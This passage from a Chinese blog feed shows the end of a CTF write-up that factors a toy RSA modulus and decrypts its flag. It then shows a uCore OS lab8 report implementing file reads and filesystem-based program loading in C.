print(<span class="string">'存在进位'</span>)</span><br></pre></td></tr></table></figure></div>
<p>输出如下：</p>
<pre><code>存在进位
</code></pre><p>因此存在进位</p>
<p>利用开方求得$(a+b)$的值，又已知$ab$，再利用一元二次方程的求根公式求出a和b的值</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">ab = ab_2</span><br><span class="line">aTb2 = aTb2_2</span><br><span class="line">aTb = gmpy2.iroot(aTb2,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">delta = gmpy2.iroot(aTb**<span class="number">2</span><span class="number">-4</span>*ab,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">print(<span class="string">'delta ='</span>,delta)</span><br><span class="line">a = gmpy2.mpz(aTb+delta)//<span class="number">2</span></span><br><span class="line">b = gmpy2.mpz(aTb-delta)//<span class="number">2</span></span><br><span class="line">p = a*pow(<span class="number">10</span>,<span class="number">500</span>)+b</span><br><span class="line">q = b*pow(<span class="number">10</span>,<span class="number">500</span>)+a</span><br><span class="line">print(p*q==pq)</span><br></pre></td></tr></table></figure></div>
<p>输出如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">delta &#x3D; 28970382423653526230782087428394120199094608888807510969672174008572263444342743452382065495452410979665183590859836472860381842418270886250846330507167646674351905885014449434182842316793842355041032703945358809543746947830533653096857965009150717206961368552309542092906822247898706652989394172510971441082397663739139074168863166474942514453940979697271097233244125249898829123427276166705668136075753341362350636336479869531538499746880132398933374584887892784910782260556527383469248578187483469</span><br><span class="line">    True</span><br></pre></td></tr></table></figure></div>
<p>由于</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">p &#x3D; next_prime(p+c)</span><br><span class="line">q &#x3D; next_prime(q+c)</span><br><span class="line">n &#x3D; p*q</span><br></pre></td></tr></table></figure></div>
<p>假设</p>
<script type="math/tex; mode=display">
\begin{align}
    p' & = p+c+x \\
    q' & = q+c+y \\ 
\end{align}</script><p>则有</p>
<script type="math/tex; mode=display">
\begin{align}
    n & = p' \cdot q' \\
      & = (p+c+x) \cdot (q+c+y)\\
      & = c^2+(p+x+q+y)c+(p+x)(q+y)\\
    \Delta & = (p+x+q+y)^2-4(p+x)(q+y)+4n \\
\end{align}</script><p>显然x、y并不大，可进行爆破，终止条件为$\Delta$是一个完全平方数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">n=<span class="number">37290153165969298170747767487987767106604956327590459309623310884436645867385405226836923826439760402232182199047042298740970941114757402758035338227352981884345194304183079410512904720516197002459598643659802383718137698974557870280366585586392385470235597777672593360788744398375690898546971801388821194234775373952698134335885991694714949974679482564600815766377388895037809222168800554222619940240853717965637149897765149770956991503459995786889995461520332980787566967767243445754450380553166156028030513979079301998632175402072502016282327825403961392784400687386536170117841528456263456021394359662685873080287765689757030352392386374307257266677811647633925457228036341541693812765785784057781251815707260401922647083928541835257244409503393940374048782722357915189148582407507806733352268172024029303953342827905707727300151171157623562387977156106983516547443642151573456682745626175061369310982040554116369983687552560719792717887667637107087090897681039368537631451824008445150593322916621649220131918968381060182780056625981084043051299820111816407714077085179863978735943069017108793879580065214612325438873475463670028900700692331942940752758392673078381358679392924527642317471983718497708036815480999969876652686414859011578133113730930542513696962965675847727315009182439824295556392013537952480748938928408290671107333656277905126915134701713932190005567660746756601077906025437341247344713253422720837604831207936303137369977025954243957891577406266667226864293421045998499026349073973676803568161225217742238807019077558158505566968246373749202724739826733649675118977232613022754175080279658222551375134841038576853604493545070340911086664690452703289923302725433846272032435289554345937247024060157309603467510583043117535674355137280615256893616267247008324272285381171004240649782585733382066689782757882726882857063752626302302445421988032917071576855484653938018800413715950664940531918933498765096986757431159488734247146715664409455285656746712809269599736842704425915921</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">    stop=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">        delta=gmpy2.mpz((p+q+x+y)**<span class="number">2</span><span class="number">-4</span>*(p+x)*(q+y)+<span class="number">4</span>*n)</span><br><span class="line">        <span class="keyword">if</span> gmpy2.iroot(delta,<span class="number">2</span>)[<span class="number">1</span>]==<span class="literal">True</span>:</span><br><span class="line">            print(<span class="string">'x, y = %d, %d'</span>%(x,y))</span><br><span class="line">            stop=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> stop:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>
<p>输出如下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">x, y &#x3D; 1, 1836</span><br></pre></td></tr></table></figure></div>
<p>用求根公式算出c的值，进而算出p和q的值</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">x, y = <span class="number">1</span>, <span class="number">1836</span></span><br><span class="line">delta =gmpy2.mpz((p+q+x+y)**<span class="number">2</span><span class="number">-4</span>*(p+x)*(q+y)+<span class="number">4</span>*n)</span><br><span class="line">c = gmpy2.iroot(delta,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">c = gmpy2.mpz(-p-q-x-y+c)//<span class="number">2</span></span><br><span class="line">print(<span class="string">'c = '</span>,c)</span><br><span class="line">p = p+c+x</span><br><span class="line">q = q+c+y</span><br><span class="line">print(p * q == n)</span><br></pre></td></tr></table></figure></div>
<p>输出如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">c &#x3D;  250059412706552500264745576027</span><br><span class="line">True</span><br></pre></td></tr></table></figure></div>
<p>最后利用RSA解密算法解密</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = gmpy2.mpz(<span class="number">37184996108096167233025618263505757153157343097156888579791591678112798126919291822117280574121886798076450090988956975942694991748710209332101082905159257360206646364269758967180975253962825625943696420172327932961625085719678913462057142665457670366149034781204452807008455874986258694889544297820868505385801547530471600056912582928858038944066247597538813265625994454536879142936629149425871030836276097612443965190900147217177268273320302968487288289500066066413057425060274495415705347775452378126322700828792271046010263910271491830733016822853700053524052302275780619672110356657862368196424416287062999248715568046365255257809392739368556770263662626707604374137827085932252100188620626033333675559976574305831148764403296339508944436482748296238651395448197460974036742794395872850277918173344274773788864080695651830624419146757315446431269176300228703998177892985982388577831521216077129479998846266657008240203501406588349129137285647942569321607846013589344817050392650458477423460119297842938591617558953789224928692831245011187614395138305116091095517452781922364575105441246935183151829079785593965595659385764661764536534314109799011221376335166825363745468702289956019189691732841787948543771767552418889945812912952844388135828118570454948482278617042826378637743128777368607901501702388930246381982139634661483616105908175895785968677045741141086145187314146524800384426347813569795767829229399693985449649456073846347751123890326703399205472967773736717062282465272801543616851680865089979007872017576434756441977097817456958807489726277542047228572876003573562220328683701400744899648300227399574965938796721337143228465728576794734241148236493866791812420360737798058399689694043617192496134725512211166304050577572889549976404923415229865890151512800020112421854251196729060158218415862519607464231622361159436715876677889457900668694738243191441657050304632774189736769141333132873006921328644347784442609254582911864794147017850676177776316795316841373510481580805823659839</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypto</span><span class="params">(p, q, e, c)</span>:</span></span><br><span class="line">    d = gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">    flag = pow(c,d,n)</span><br><span class="line">    flag = long_to_bytes(flag)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">print(decrypto(p, q, e, c))</span><br></pre></td></tr></table></figure></div>
<pre><code>b&#39;flag{ddc4205ecd6c22035acae589113bb8aa}&#39;
</code></pre><p>得到<code>flag{ddc4205ecd6c22035acae589113bb8aa}</code></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>uCoreOs lab8 实验报告</title>
    <url>/posts/7a4984ba/</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><p>通过完成本次实验，希望能达到以下目标</p>
<ul>
<li>了解基本的文件系统系统调用的实现方法；</li>
<li>了解一个基于索引节点组织方式的Simple FS文件系统的设计与实现；</li>
<li>了解文件系统抽象层-VFS的设计与实现；<a id="more"></a></li>
</ul>
<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><h2 id="练习0：填写已有实验"><a href="#练习0：填写已有实验" class="headerlink" title="练习0：填写已有实验"></a>练习0：填写已有实验</h2><p>本实验依赖实验1/2/3/4/5/6/7。请把你做的实验1/2/3/4/5/6/7的代码填入本实验中代码中有“LAB1”/“LAB2”/“LAB3”/“LAB4”/“LAB5”/“LAB6” /“LAB7”的注释相应部分。并确保编译通过。注意：为了能够正确执行lab8的测试应用程序，可能需对已完成的实验1/2/3/4/5/6/7的代码进行进一步改进。</p>
<p>要修改的文件有<code>proc.c default_pmm.c pmm.c swap_fifo.c vmm.c trap.c kdebug.c monitor.c check_sync.c</code></p>
<p>并将lab7的<code>default_sched_stride.c</code>复制到lab8，并对<code>default_sched.h sched.c</code>做修改</p>
<p>本次实验需要编写代码的地方</p>
<p><img src="/images/loading.gif" data-original="/posts/7a4984ba/image-20200530170610244.png" alt="image-20200530170610244"></p>
<h2 id="练习1-完成读文件操作的实现（需要编码）"><a href="#练习1-完成读文件操作的实现（需要编码）" class="headerlink" title="练习1: 完成读文件操作的实现（需要编码）"></a>练习1: 完成读文件操作的实现（需要编码）</h2><p>首先了解打开文件的处理流程，然后参考本实验后续的文件读写操作的过程分析，编写在sfs_inode.c中sfs_io_nolock读文件中数据的实现代码。</p>
<p>请在实验报告中给出设计实现”UNIX的PIPE机制“的概要设方案，鼓励给出详细设计方案</p>
<p><img src="/images/loading.gif" data-original="/posts/7a4984ba/image-20200530202748314.png" alt="image-20200530202748314"></p>
<p>编辑./kern/fs/sfs/sfs_inode.c</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> * sfs_io_nolock - Rd/Wr a file contentfrom offset position to offset+ length  disk blocks&lt;--&gt;buffer (in memroy)</span></span><br><span class="line"><span class="comment"> * @sfs:      sfs file system</span></span><br><span class="line"><span class="comment"> * @sin:      sfs inode in memory</span></span><br><span class="line"><span class="comment"> * @buf:      the buffer Rd/Wr</span></span><br><span class="line"><span class="comment"> * @offset:   the offset of file</span></span><br><span class="line"><span class="comment"> * @alenp:    the length need to read (is a pointer). and will RETURN the really Rd/Wr lenght</span></span><br><span class="line"><span class="comment"> * @write:    BOOL, 0 read, 1 write</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sfs_io_nolock(struct sfs_fs *sfs, struct sfs_inode *<span class="built_in">sin</span>, <span class="keyword">void</span> *buf, <span class="keyword">off_t</span> offset, <span class="keyword">size_t</span> *alenp, <span class="keyword">bool</span> <span class="built_in">write</span>) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sfs_disk_inode</span> *<span class="title">din</span> = <span class="title">sin</span>-&gt;<span class="title">din</span>;</span></span><br><span class="line">    assert(din-&gt;type != SFS_TYPE_DIR);</span><br><span class="line">    <span class="keyword">off_t</span> endpos = offset + *alenp, blkoff;</span><br><span class="line">    *alenp = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// calculate the Rd/Wr end position</span></span><br><span class="line">    <span class="keyword">if</span> (offset &lt; <span class="number">0</span> || offset &gt;= SFS_MAX_FILE_SIZE || offset &gt; endpos) &#123;</span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (offset == endpos) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (endpos &gt; SFS_MAX_FILE_SIZE) &#123;</span><br><span class="line">        endpos = SFS_MAX_FILE_SIZE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">write</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (offset &gt;= din-&gt;<span class="built_in">size</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (endpos &gt; din-&gt;<span class="built_in">size</span>) &#123;</span><br><span class="line">            endpos = din-&gt;<span class="built_in">size</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> (*sfs_buf_op)(struct sfs_fs *sfs, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">uint32_t</span> blkno, <span class="keyword">off_t</span> offset);</span><br><span class="line">    <span class="keyword">int</span> (*sfs_block_op)(struct sfs_fs *sfs, <span class="keyword">void</span> *buf, <span class="keyword">uint32_t</span> blkno, <span class="keyword">uint32_t</span> nblks);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">write</span>) &#123;</span><br><span class="line">        sfs_buf_op = sfs_wbuf, sfs_block_op = sfs_wblock;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        sfs_buf_op = sfs_rbuf, sfs_block_op = sfs_rblock;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> <span class="built_in">size</span>, alen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> ino;</span><br><span class="line">    <span class="keyword">uint32_t</span> blkno = offset / SFS_BLKSIZE;          <span class="comment">// The NO. of Rd/Wr begin block</span></span><br><span class="line">    <span class="keyword">uint32_t</span> nblks = endpos / SFS_BLKSIZE - blkno;  <span class="comment">// The size of Rd/Wr blocks</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//LAB8:EXERCISE1 YOUR CODE HINT: call sfs_bmap_load_nolock, sfs_rbuf, sfs_rblock,etc. read different kind of blocks in file</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * (1) If offset isn't aligned with the first block, Rd/Wr some content from offset to the end of the first block</span></span><br><span class="line"><span class="comment">	 *       NOTICE: useful function: sfs_bmap_load_nolock, sfs_buf_op</span></span><br><span class="line"><span class="comment">	 *               Rd/Wr size = (nblks != 0) ? (SFS_BLKSIZE - blkoff) : (endpos - offset)</span></span><br><span class="line"><span class="comment">	 * (2) Rd/Wr aligned blocks </span></span><br><span class="line"><span class="comment">	 *       NOTICE: useful function: sfs_bmap_load_nolock, sfs_block_op</span></span><br><span class="line"><span class="comment">     * (3) If end position isn't aligned with the last block, Rd/Wr some content from begin to the (endpos % SFS_BLKSIZE) of the last block</span></span><br><span class="line"><span class="comment">	 *       NOTICE: useful function: sfs_bmap_load_nolock, sfs_buf_op	</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"><span class="comment">/****************************下面是增加的代码********************************/</span></span><br><span class="line">    <span class="comment">// 先判断第一块的情况 如果没对齐 就从偏移的地方读取</span></span><br><span class="line">    <span class="keyword">if</span> ((blkoff = offset % SFS_BLKSIZE) != <span class="number">0</span>)  &#123;</span><br><span class="line">        <span class="comment">// 判断 endpos 和 offset 是否在同一块中</span></span><br><span class="line">        <span class="comment">// 若为同一块 则 size 为 endpos - offset</span></span><br><span class="line">        <span class="comment">// 若不为同一块 则 size 为 SFS_BLKSIZE - blkoff(偏移) 为 第一块要读的大小</span></span><br><span class="line">        <span class="built_in">size</span> = (nblks != <span class="number">0</span>) ? (SFS_BLKSIZE - blkoff) : (endpos - offset);</span><br><span class="line">        <span class="keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, <span class="built_in">sin</span>, blkno, &amp;ino)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((ret = sfs_buf_op(sfs, buf, <span class="built_in">size</span>, ino, blkoff)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        alen += <span class="built_in">size</span>;</span><br><span class="line">        <span class="keyword">if</span> (nblks == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        buf += <span class="built_in">size</span>, blkno++; nblks--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 中间对齐的情况</span></span><br><span class="line">    <span class="built_in">size</span> = SFS_BLKSIZE;</span><br><span class="line">    <span class="keyword">while</span> (nblks != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, <span class="built_in">sin</span>, blkno, &amp;ino)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((ret = sfs_block_op(sfs, buf, ino, <span class="number">1</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        alen += <span class="built_in">size</span>, buf += <span class="built_in">size</span>, blkno++, nblks--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 末尾最后一块没对齐的情况</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="built_in">size</span> = endpos % SFS_BLKSIZE) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, <span class="built_in">sin</span>, blkno, &amp;ino)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((ret = sfs_buf_op(sfs, buf, <span class="built_in">size</span>, ino, <span class="number">0</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        alen += <span class="built_in">size</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*****************************上面是增加的代码*****************************/</span></span><br><span class="line">out:</span><br><span class="line">    *alenp = alen;</span><br><span class="line">    <span class="keyword">if</span> (offset + alen &gt; <span class="built_in">sin</span>-&gt;din-&gt;<span class="built_in">size</span>) &#123;</span><br><span class="line">        <span class="built_in">sin</span>-&gt;din-&gt;<span class="built_in">size</span> = offset + alen;</span><br><span class="line">        <span class="built_in">sin</span>-&gt;dirty = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="练习2-完成基于文件系统的执行程序机制的实现（需要编码）"><a href="#练习2-完成基于文件系统的执行程序机制的实现（需要编码）" class="headerlink" title="练习2: 完成基于文件系统的执行程序机制的实现（需要编码）"></a>练习2: 完成基于文件系统的执行程序机制的实现（需要编码）</h2><p>改写proc.c中的load_icode函数和其他相关函数，实现基于文件系统的执行程序机制。执行：make qemu。如果能看看到sh用户程序的执行界面，则基本成功了。如果在sh用户界面上可以执行”ls”,”hello”等其他放置在sfs文件系统中的其他执行程序，则可以认为本实验基本成功。</p>
<p>请在实验报告中给出设计实现基于”UNIX的硬链接和软链接机制“的概要设方案，鼓励给出详细设计方案</p>
<p>可以在 Lab 7 的基础上进行修改 读elf文件变成了从磁盘上读 而不是直接在内存中读</p>
<p>修改proc.c</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// alloc_proc - alloc a proc_struct and init all fields of proc_struct</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *</span></span><br><span class="line"><span class="class"><span class="title">alloc_proc</span>(<span class="title">void</span>) &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span> = <span class="title">kmalloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">proc_struct</span>));</span></span><br><span class="line">    <span class="keyword">if</span> (proc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">     ...</span><br><span class="line">    <span class="comment">//LAB8:EXERCISE2 YOUR CODE HINT:need add some code to init fs in proc_struct, ...</span></span><br><span class="line">+   proc-&gt;filesp = <span class="literal">NULL</span>; <span class="comment">//初始化fs中的进程控制结构</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> proc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* do_fork -     parent process for a new child process</span></span><br><span class="line"><span class="comment"> * @clone_flags: used to guide how to clone the child process</span></span><br><span class="line"><span class="comment"> * @stack:       the parent's user stack pointer. if stack==0, It means to fork a kernel thread.</span></span><br><span class="line"><span class="comment"> * @tf:          the trapframe info, which will be copied to child process's proc-&gt;tf</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">do_fork(<span class="keyword">uint32_t</span> clone_flags, <span class="keyword">uintptr_t</span> <span class="built_in">stack</span>, struct trapframe *tf) &#123;</span><br><span class="line">    <span class="keyword">int</span> ret = -E_NO_FREE_PROC;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (nr_process &gt;= MAX_PROCESS) &#123;</span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = -E_NO_MEM;</span><br><span class="line">    <span class="comment">//LAB4:EXERCISE2 YOUR CODE</span></span><br><span class="line">    <span class="comment">//LAB8:EXERCISE2 YOUR CODE  HINT:how to copy the fs in parent's proc_struct?</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Some Useful MACROs, Functions and DEFINEs, you can use them in below implementation.</span></span><br><span class="line"><span class="comment">     * MACROs or Functions:</span></span><br><span class="line"><span class="comment">     *   alloc_proc:   create a proc struct and init fields (lab4:exercise1)</span></span><br><span class="line"><span class="comment">     *   setup_kstack: alloc pages with size KSTACKPAGE as process kernel stack</span></span><br><span class="line"><span class="comment">     *   copy_mm:      process "proc" duplicate OR share process "current"'s mm according clone_flags</span></span><br><span class="line"><span class="comment">     *                 if clone_flags &amp; CLONE_VM, then "share" ; else "duplicate"</span></span><br><span class="line"><span class="comment">     *   copy_thread:  setup the trapframe on the  process's kernel stack top and</span></span><br><span class="line"><span class="comment">     *                 setup the kernel entry point and stack of process</span></span><br><span class="line"><span class="comment">     *   hash_proc:    add proc into proc hash_list</span></span><br><span class="line"><span class="comment">     *   get_pid:      alloc a unique pid for process</span></span><br><span class="line"><span class="comment">     *   wakup_proc:   set proc-&gt;state = PROC_RUNNABLE</span></span><br><span class="line"><span class="comment">     * VARIABLES:</span></span><br><span class="line"><span class="comment">     *   proc_list:    the process set's list</span></span><br><span class="line"><span class="comment">     *   nr_process:   the number of process set</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//    1. call alloc_proc to allocate a proc_struct</span></span><br><span class="line">    <span class="comment">//    2. call setup_kstack to allocate a kernel stack for child process</span></span><br><span class="line">    <span class="comment">//    3. call copy_mm to dup OR share mm according clone_flag</span></span><br><span class="line">    <span class="comment">//    4. call copy_thread to setup tf &amp; context in proc_struct</span></span><br><span class="line">    <span class="comment">//    5. insert proc_struct into hash_list &amp;&amp; proc_list</span></span><br><span class="line">    <span class="comment">//    6. call wakup_proc to make the new child process RUNNABLE</span></span><br><span class="line">    <span class="comment">//    7. set ret vaule using child proc's pid</span></span><br><span class="line">	<span class="comment">//LAB5 YOUR CODE : (update LAB4 steps)</span></span><br><span class="line">   <span class="comment">/* Some Functions</span></span><br><span class="line"><span class="comment">    *    set_links:  set the relation links of process.  ALSO SEE: remove_links:  lean the relation links of process </span></span><br><span class="line"><span class="comment">    *    -------------------</span></span><br><span class="line"><span class="comment">	*    update step 1: set child proc's parent to current process, make sure current process's wait_state is 0</span></span><br><span class="line"><span class="comment">	*    update step 5: insert proc_struct into hash_list &amp;&amp; proc_list, set the relation links of process</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">//    2. call setup_kstack to allocate a kernel stack for child process</span></span><br><span class="line">    <span class="keyword">if</span> (setup_kstack(proc) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_proc;</span><br><span class="line">    &#125;</span><br><span class="line">+   <span class="comment">//以拷贝文件的方式来完成父子进程之间的拷贝</span></span><br><span class="line">+   <span class="keyword">if</span> (copy_files(clone_flags, proc) != <span class="number">0</span>) &#123;</span><br><span class="line">+       <span class="keyword">goto</span> bad_fork_cleanup_kstack;</span><br><span class="line">+   &#125;</span><br><span class="line">    <span class="comment">//    3. call copy_mm to dup OR share mm according clone_flag</span></span><br><span class="line">    <span class="keyword">if</span> (copy_mm(clone_flags, proc) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_kstack;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// load_icode -  called by sys_exec--&gt;do_execve</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">load_icode(<span class="keyword">int</span> fd, <span class="keyword">int</span> argc, <span class="keyword">char</span> **kargv) &#123;</span><br><span class="line">    <span class="comment">/* LAB8:EXERCISE2 YOUR CODE  HINT:how to load the file with handler fd  in to process's memory? how to setup argc/argv?</span></span><br><span class="line"><span class="comment">     * MACROs or Functions:</span></span><br><span class="line"><span class="comment">     *  mm_create        - create a mm</span></span><br><span class="line"><span class="comment">     *  setup_pgdir      - setup pgdir in mm</span></span><br><span class="line"><span class="comment">     *  load_icode_read  - read raw data content of program file</span></span><br><span class="line"><span class="comment">     *  mm_map           - build new vma</span></span><br><span class="line"><span class="comment">     *  pgdir_alloc_page - allocate new memory for  TEXT/DATA/BSS/stack parts</span></span><br><span class="line"><span class="comment">     *  lcr3             - update Page Directory Addr Register -- CR3</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">	<span class="comment">/* (1) create a new mm for current process</span></span><br><span class="line"><span class="comment">     * (2) create a new PDT, and mm-&gt;pgdir= kernel virtual addr of PDT</span></span><br><span class="line"><span class="comment">     * (3) copy TEXT/DATA/BSS parts in binary to memory space of process</span></span><br><span class="line"><span class="comment">     *    (3.1) read raw data content in file and resolve elfhdr</span></span><br><span class="line"><span class="comment">     *    (3.2) read raw data content in file and resolve proghdr based on info in elfhdr</span></span><br><span class="line"><span class="comment">     *    (3.3) call mm_map to build vma related to TEXT/DATA</span></span><br><span class="line"><span class="comment">     *    (3.4) callpgdir_alloc_page to allocate page for TEXT/DATA, read contents in file</span></span><br><span class="line"><span class="comment">     *          and copy them into the new allocated pages</span></span><br><span class="line"><span class="comment">     *    (3.5) callpgdir_alloc_page to allocate pages for BSS, memset zero in these pages</span></span><br><span class="line"><span class="comment">     * (4) call mm_map to setup user stack, and put parameters into user stack</span></span><br><span class="line"><span class="comment">     * (5) setup current process's mm, cr3, reset pgidr (using lcr3 MARCO)</span></span><br><span class="line"><span class="comment">     * (6) setup uargc and uargv in user stacks</span></span><br><span class="line"><span class="comment">     * (7) setup trapframe for user environment</span></span><br><span class="line"><span class="comment">     * (8) if up steps failed, you should cleanup the env.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (current-&gt;mm != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        panic(<span class="string">"load_icode: current-&gt;mm must be empty.\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ret = -E_NO_MEM;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span></span><br><span class="line">    <span class="keyword">if</span> ((mm = mm_create()) 